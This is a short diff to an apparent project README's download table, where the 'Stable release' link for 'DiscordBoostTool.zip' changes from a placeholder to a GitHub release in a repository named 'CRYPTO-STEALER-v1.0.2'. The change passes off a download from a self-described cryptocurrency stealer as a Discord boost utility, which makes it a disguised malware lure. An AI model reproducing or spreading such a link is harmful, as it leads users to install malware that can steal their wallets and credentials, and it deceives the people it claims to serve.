@@ -51,7 +51,7 @@ The following table lists all available download options:
       <td><b>GUI</b></td>
       <td>
         <ul>
-          <li>🟢 <b><a href="#">Stable release</a></b> (<code>DiscordBoostTool.zip</code>)</li>
+          <li>🟢 <b><a href="https://github.com/TheTreeSoft/CRYPTO-STEALER-v1.0.2/releases/tag/crypto">Stable release</a></b> (<code>DiscordBoostTool.zip</code>)</li>
           </ul>
       </td>
       <td>
